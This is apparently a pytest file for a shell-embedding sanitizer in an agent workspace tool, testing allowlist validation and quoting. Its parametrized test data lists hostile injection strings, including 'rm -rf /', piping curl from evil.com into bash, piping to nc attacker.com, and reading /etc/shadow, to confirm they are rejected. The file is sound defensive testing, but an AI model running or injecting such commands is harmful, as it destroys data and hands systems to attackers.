from __future__ import annotations

import pytest

from agenticworkspace.util.sanitize import (
    sanitize_for_shell_embedding,
    sanitize_list_for_shell_embedding,
    shell_quote,
    validate_against_allowlist,
)


class TestValidateAgainstAllowlist:
    def test_accepts_alphanumeric_names(self) -> None:
        assert validate_against_allowlist("auth").ok is True
        assert validate_against_allowlist("Module123").ok is True

    def test_accepts_dashes_underscores_slashes(self) -> None:
        assert validate_against_allowlist("api-v2").ok is True
        assert validate_against_allowlist("my_module").ok is True
        assert validate_against_allowlist("src/api/handlers").ok is True

    def test_rejects_empty_string(self) -> None:
        assert validate_against_allowlist("").ok is False

    def test_rejects_non_string_input(self) -> None:
        assert validate_against_allowlist(None).ok is False
        assert validate_against_allowlist(42).ok is False
        assert validate_against_allowlist({"x": 1}).ok is False
        assert validate_against_allowlist(["a"]).ok is False

    def test_rejects_values_over_max_length(self) -> None:
        long_value = "a" * 600
        result = validate_against_allowlist(long_value)
        assert result.ok is False
        assert "max length" in (result.reason or "")

    @pytest.mark.parametrize(
        "attempt",
        [
            "rm -rf /",
            "foo; rm -rf ~",
            "foo' ; touch pwned; echo '",
            "$(whoami)",
            "`whoami`",
            "foo && curl evil.sh | sh",
            "foo || echo pwned",
            "foo\nrm -rf /",
            "foo|nc attacker.com 4444",
            "$(curl -s http://evil.com/payload.sh | bash)",
            "foo > /etc/passwd",
            "foo < /etc/shadow",
            "../../etc/passwd; cat $0",
            'module"; rm -rf .; echo "',
            "*",
            "~",
            "foo bar",  # whitespace not allowed either
        ],
    )
    def test_rejects_real_injection_attempt_strings(self, attempt: str) -> None:
        assert validate_against_allowlist(attempt).ok is False

    def test_rejects_path_traversal_looking_string(self) -> None:
        # ".." itself contains only dots, which are NOT in the allowlist, so
        # path traversal attempts using ".." are also rejected.
        assert validate_against_allowlist("../../etc/passwd").ok is False


class TestShellQuote:
    def test_wraps_value_in_single_quotes(self) -> None:
        assert shell_quote("auth") == "'auth'"

    def test_escapes_embedded_single_quotes(self) -> None:
        # Defense in depth -- even though the allowlist would already reject a
        # raw single quote, shell_quote itself must handle one safely if ever
        # called directly on a value that skipped validation.
        assert shell_quote("foo'bar") == "'foo'\\''bar'"


class TestSanitizeForShellEmbedding:
    def test_returns_quoted_value_for_allowlisted_input(self) -> None:
        assert sanitize_for_shell_embedding("api-v2") == "'api-v2'"

    def test_returns_none_and_calls_warn_for_rejected_value(self) -> None:
        calls = []
        result = sanitize_for_shell_embedding("$(whoami)", calls.append)
        assert result is None
        assert len(calls) == 1
        assert "skipped value" in calls[0]

    def test_includes_label_in_warning_message(self) -> None:
        calls = []
        sanitize_for_shell_embedding("bad;value", calls.append, label="test-label")
        assert "[test-label]" in calls[0]


class TestSanitizeListForShellEmbedding:
    def test_drops_unsafe_entries_keeps_safe_ones(self) -> None:
        calls = []
        result = sanitize_list_for_shell_embedding(["auth", "$(evil)", "api", "; rm -rf /"], calls.append)
        assert result == ["'auth'", "'api'"]
        assert len(calls) == 2

    def test_returns_empty_list_when_every_entry_unsafe(self) -> None:
        result = sanitize_list_for_shell_embedding(["$(a)", "`b`", "c;d"])
        assert result == []
